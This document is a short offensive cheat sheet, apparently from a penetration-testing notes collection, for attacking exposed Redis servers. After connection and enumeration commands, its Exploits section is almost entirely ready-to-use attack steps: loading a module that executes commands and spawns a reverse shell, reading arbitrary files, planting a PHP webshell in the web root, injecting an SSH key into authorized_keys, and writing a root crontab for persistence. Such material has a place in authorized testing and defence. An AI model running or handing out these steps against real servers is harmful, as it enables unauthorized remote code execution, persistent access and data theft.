# Redis

## Commands

### Check connection

```
HELLO
PING
TIME
```

### Login

#### with nc

```
nc -nv <ip> <port>
info    #check if authentication is required
auth <user> <pass>
```

#### with redis-cli

```
apt-get install redis-tools
redis-cli -h <ip> -p <port>    #no password
redis-cli -h <ip> -p <port> -a <pass>
```

### Enumeration

```
info
client list
config GET *
config GET dir
SELECT <db number>    #see output of INFO command for database numbers
KEYS *
GET <key> 
```

## Exploits

### Run code with ExecuteCommand module

Requires access to writable folders on target's machine

```
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd RedisModules-ExecuteCommand
make
copy ./src/module.so to the remote machine
nc -ncv <ip> <port>
MODULE LOAD <remote path>/module.so
```

#### Execute commands

after connecting to Redis with `nc` or `redis-cli` and loading the module

```
system.exec "<command>"
system.rev <ip> <port>    #spawn a reverse shell
```

### Read file

```
EVAL dofile('<file>') 0
```

### Webshell in site root

```
config set dir <webapp root>
config set dbfilename rv.php
set test "<?php echo shell_exec($_GET['cmd']);?>"    #usage: /rv.php?cmd=<command>
save
```

### SSH key injection

```
ssh-keygen -t rsa    #save the keys in the current folder
(echo -e "\n\n"; cat ./id_rsa.pub; echo -e "\n\n") > key.txt
cat key.txt | redis-cli -h <ip> -p <port> -x set crackit
redis-cli -h <ip> -p <port>
config set dir /home/<user>/.ssh/
config set dbfilename "authorized_keys"
save
exit
ssh <user>@<ip> -i ./id_rsa
```

### Crontab edit

```
echo -e "\n\n*/1 * * * * <command>\n\n"|redis-cli -h 10.85.0.52 -x set 1
redis-cli -h <ip> -p <port>
config set dir /var/spool/cron/crontabs/    #for CentOS the dir is /var/spool/cron/
config set dbfilename root
save
```

